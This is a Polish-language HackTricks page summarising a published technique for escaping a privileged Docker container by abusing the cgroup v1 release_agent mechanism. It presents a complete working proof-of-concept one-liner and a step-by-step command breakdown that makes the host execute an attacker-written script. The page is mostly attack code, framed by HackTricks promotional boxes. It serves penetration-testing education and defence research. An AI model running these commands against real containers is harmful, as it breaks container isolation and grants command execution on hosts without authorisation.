# Ucieczka z cgroups w Dockerze za pomocą release_agent

<details>

<summary><strong>Naucz się hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć **reklamę swojej firmy w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLAN SUBSKRYPCYJNY**](https://github.com/sponsors/carlospolop)!
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>


**Aby uzyskać więcej szczegółów, odwołaj się do [oryginalnego wpisu na blogu](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/).** Oto tylko streszczenie:

Pierwotny PoC:
```shell
d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`
mkdir -p $d/w;echo 1 >$d/w/notify_on_release
t=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
touch /o; echo $t/c >$d/release_agent;echo "#!/bin/sh
$1 >$t/o" >/c;chmod +x /c;sh -c "echo 0 >$d/w/cgroup.procs";sleep 1;cat /o
```
Dowód koncepcji (PoC) demonstruje metodę wykorzystania cgroups poprzez utworzenie pliku `release_agent` i wywołanie go w celu wykonania dowolnych poleceń na hoście kontenera. Oto podział na kroki:

1. **Przygotowanie środowiska:**
- Tworzony jest katalog `/tmp/cgrp`, który będzie służył jako punkt montowania dla cgroup.
- Kontroler cgroup RDMA jest montowany do tego katalogu. W przypadku braku kontrolera RDMA zaleca się używanie kontrolera `memory` jako alternatywy.
```shell
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
```
2. **Utwórz podrzędny Cgroup:**
- Wewnątrz zamontowanego katalogu Cgroup tworzony jest podrzędny Cgroup o nazwie "x".
- Aby włączyć powiadomienia dla Cgroup "x", należy zapisać wartość 1 do pliku notify_on_release.
```shell
echo 1 > /tmp/cgrp/x/notify_on_release
```
3. **Skonfiguruj agenta wydania:**
- Ścieżka kontenera na hoście jest pobierana z pliku /etc/mtab.
- Następnie plik release_agent cgroup jest konfigurowany tak, aby wykonywał skrypt o nazwie /cmd znajdujący się w pobranej ścieżce hosta.
```shell
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/cmd" > /tmp/cgrp/release_agent
```
4. **Utwórz i skonfiguruj skrypt /cmd:**
- Skrypt /cmd jest tworzony wewnątrz kontenera i konfigurowany do wykonania polecenia ps aux, przekierowując wynik do pliku o nazwie /output w kontenerze. Podawana jest pełna ścieżka do /output na hoście.
```shell
echo '#!/bin/sh' > /cmd
echo "ps aux > $host_path/output" >> /cmd
chmod a+x /cmd
```
5. **Wywołaj atak:**
- Proces jest uruchamiany wewnątrz grupy potomnej "x" i natychmiast jest zamykany.
- To powoduje uruchomienie `release_agent` (skryptu /cmd), który wykonuje polecenie ps aux na hoście i zapisuje wynik do /output wewnątrz kontenera.
```shell
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```
<details>

<summary><strong>Naucz się hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytoriów github.

</details>
